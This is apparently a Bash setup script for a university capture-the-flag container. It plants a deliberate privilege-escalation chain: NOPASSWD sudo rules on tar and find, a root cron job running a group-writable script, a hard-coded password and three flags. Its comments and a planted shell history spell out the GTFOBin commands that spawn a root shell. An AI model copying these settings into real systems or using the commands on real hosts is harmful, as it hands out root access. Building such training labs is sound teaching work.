#!/usr/bin/env bash
#
# privesc-init.sh — Hook de Pós-Exploração / Escalada de Privilégios
# ============================================================================
# CTF SIGAA-Next (Segurança Computacional / LabSec — UnB) — "Integrante 4".
#
# Executado como ROOT pelo entrypoint.sh (ver /opt/ctf/privesc-init.sh) ANTES
# de subir cron/vsftpd/sshd. Responsável por montar a CADEIA DE ESCALADA depois
# que o jogador obtém o foothold SSH como `estagiario_sti`:
#
#   [foothold] estagiario_sti  --(sudo GTFOBin: tar)-->  coord_redes
#   coord_redes                --(sudo GTFOBin: find)-->  root
#                              --(alternativa: cron + script gravável)--> root
#
# E planta as 3 flags no formato TAC{...}:
#   /home/estagiario_sti/user.txt   (foothold — lida pelo ctf_e2e_test.sh Fase 5)
#   /home/coord_redes/user2.txt     (movimento lateral)
#   /root/root.txt                  (comprometimento total)
#
# TUDO fictício e 100% isolado em container. As "vulnerabilidades" (regras
# sudo NOPASSWD em binários GTFOBins + script de cron gravável por grupo) são
# INTENCIONAIS e existem só para fins didáticos.
#
# O script é IDEMPOTENTE: pode rodar de novo num restart do container sem quebrar
# (e nunca deve retornar != 0, senão o entrypoint com `set -e` derruba o boot).
# ============================================================================

set -u
log() { printf '[privesc-init] %s\n' "$*"; }

# ---------------------------------------------------------------------------
# Flags (fictícias). Dão para parametrizar por env na integração final.
# ---------------------------------------------------------------------------
FLAG_USER="${FLAG_USER:-TAC{f00th0ld_ssh_3stagiari0_sti}}"
FLAG_LATERAL="${FLAG_LATERAL:-TAC{m0v1ment0_lateral_sud0_tar_c00rd_redes}}"
FLAG_ROOT="${FLAG_ROOT:-TAC{r00t_sig4a_next_sud0_find_pwn3d_2026}}"

# ---------------------------------------------------------------------------
# 1. Usuário intermediário da escalada: coord_redes
#    (já referenciado no seed.ts [role=admin] e no AllowUsers do sshd_ctf.conf)
# ---------------------------------------------------------------------------
if ! id -u coord_redes >/dev/null 2>&1; then
  log "Criando usuário intermediário coord_redes..."
  useradd -m -s /bin/bash coord_redes
fi
# Senha de serviço (não precisa ser descoberta pelo jogador; a escalada é via sudo).
echo "coord_redes:C00rd#R3des_Sti_2026!" | chpasswd
# Garante conta destravada (cron/PAM não pulam a conta por estar bloqueada).
passwd -u coord_redes >/dev/null 2>&1 || true

# Grupo de "manutenção" usado pela via alternativa de cron.
getent group sti-maint >/dev/null 2>&1 || groupadd sti-maint
usermod -aG sti-maint coord_redes

# ---------------------------------------------------------------------------
# 2. VULN SUDO #1 (movimento lateral): estagiario_sti -> coord_redes
#    Regra NOPASSWD em /usr/bin/tar. GTFOBin clássico:
#      sudo -u coord_redes /usr/bin/tar -cf /dev/null /dev/null \
#           --checkpoint=1 --checkpoint-action=exec=/bin/bash
#    -> abre um shell com UID real de coord_redes (permite o próximo sudo).
# ---------------------------------------------------------------------------
log "Instalando regra sudo vulnerável: estagiario_sti -> coord_redes (tar)"
cat > /etc/sudoers.d/10-estagiario-manutencao <<'EOF'
# [CTF - VULN INTENCIONAL] Bolsista pode rodar o "backup de configs" como
# coord_redes sem senha. /usr/bin/tar é um GTFOBin -> shell como coord_redes.
estagiario_sti ALL=(coord_redes) NOPASSWD: /usr/bin/tar
EOF
chmod 440 /etc/sudoers.d/10-estagiario-manutencao

# ---------------------------------------------------------------------------
# 3. VULN SUDO #2 (escalada p/ root): coord_redes -> root
#    Regra NOPASSWD em /usr/bin/find. GTFOBin clássico:
#      sudo /usr/bin/find /etc/hostname -exec /bin/bash \;
#    -> shell de root.
# ---------------------------------------------------------------------------
log "Instalando regra sudo vulnerável: coord_redes -> root (find)"
cat > /etc/sudoers.d/20-coord-redes-root <<'EOF'
# [CTF - VULN INTENCIONAL] "Diagnóstico de rede" como root sem senha.
# /usr/bin/find é um GTFOBin -> shell de root.
coord_redes ALL=(root) NOPASSWD: /usr/bin/find
EOF
chmod 440 /etc/sudoers.d/20-coord-redes-root

# Valida a sintaxe do sudoers (não aborta o boot se o visudo reclamar).
if command -v visudo >/dev/null 2>&1; then
  visudo -cf /etc/sudoers >/dev/null 2>&1 && log "sudoers OK (visudo -c)" \
    || log "AVISO: visudo -c acusou problema no sudoers — revisar"
fi

# ---------------------------------------------------------------------------
# 4. VULN CRON (via ALTERNATIVA p/ root): script gravável pelo grupo sti-maint
#    /etc/cron.d/sti-backup roda como ROOT a cada minuto um script que o grupo
#    sti-maint (coord_redes) pode editar. Depois do movimento lateral, dá root
#    por um segundo caminho (ensina cron-privesc além de sudo/GTFOBins).
# ---------------------------------------------------------------------------
log "Instalando cron de backup com script gravável por grupo (via alternativa)"
mkdir -p /opt/sti
cat > /opt/sti/backup-configs.sh <<'EOF'
#!/bin/bash
# "Backup" periódico das configs do SIGAA-Next (roda como root via cron).
# [CTF - VULN INTENCIONAL] Este arquivo é gravável pelo grupo sti-maint.
tar -czf /var/backups/sti-configs.tgz /opt/sti 2>/dev/null
EOF
# root dono, grupo sti-maint COM escrita (775) -> coord_redes pode injetar comando.
chown root:sti-maint /opt/sti/backup-configs.sh
chmod 775 /opt/sti/backup-configs.sh
mkdir -p /var/backups

cat > /etc/cron.d/sti-backup <<'EOF'
# [CTF] Backup de configs do SIGAA-Next — executa como root a cada minuto.
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * root /opt/sti/backup-configs.sh
EOF
# cron.d exige dono root e NÃO gravável por grupo/outros, senão é ignorado.
chown root:root /etc/cron.d/sti-backup
chmod 644 /etc/cron.d/sti-backup

# ---------------------------------------------------------------------------
# 5. Flags TAC{...}
# ---------------------------------------------------------------------------
log "Plantando flags TAC{...}"

# Flag 1 — foothold (lida pelo ctf_e2e_test.sh na Fase 5)
printf '%s\n' "$FLAG_USER" > /home/estagiario_sti/user.txt
chown estagiario_sti:estagiario_sti /home/estagiario_sti/user.txt
chmod 640 /home/estagiario_sti/user.txt

# Flag 2 — movimento lateral (só coord_redes lê)
printf '%s\n' "$FLAG_LATERAL" > /home/coord_redes/user2.txt
chown coord_redes:coord_redes /home/coord_redes/user2.txt
chmod 640 /home/coord_redes/user2.txt

# Flag 3 — root (só root lê)
printf '%s\n' "$FLAG_ROOT" > /root/root.txt
chown root:root /root/root.txt
chmod 600 /root/root.txt

# ---------------------------------------------------------------------------
# 6. Breadcrumbs (pistas sutis, sem entregar o caminho de bandeja)
# ---------------------------------------------------------------------------
cat > /home/estagiario_sti/LEIA-ME-manutencao.txt <<'EOF'
Bolsista, lembrete do coord_redes:

Pra qualquer tarefa de manutenção que precise de mais privilégio, eu liberei
umas coisas pontuais pro seu usuário rodar sem ficar me pedindo senha toda hora.
Dá uma olhada no que você pode executar com:

    sudo -l

(Se precisar mexer em backup de config, use as ferramentas padrão do sistema.)
    -- coord_redes (STI / Redes)
EOF
chown estagiario_sti:estagiario_sti /home/estagiario_sti/LEIA-ME-manutencao.txt
chmod 644 /home/estagiario_sti/LEIA-ME-manutencao.txt

cat > /home/coord_redes/.bash_history <<'EOF'
id
sudo -l
sudo /usr/bin/find /etc/hostname -exec /bin/bash \;
cat /root/root.txt
EOF
chown coord_redes:coord_redes /home/coord_redes/.bash_history
chmod 600 /home/coord_redes/.bash_history

log "Escalada e flags configuradas com sucesso."
exit 0
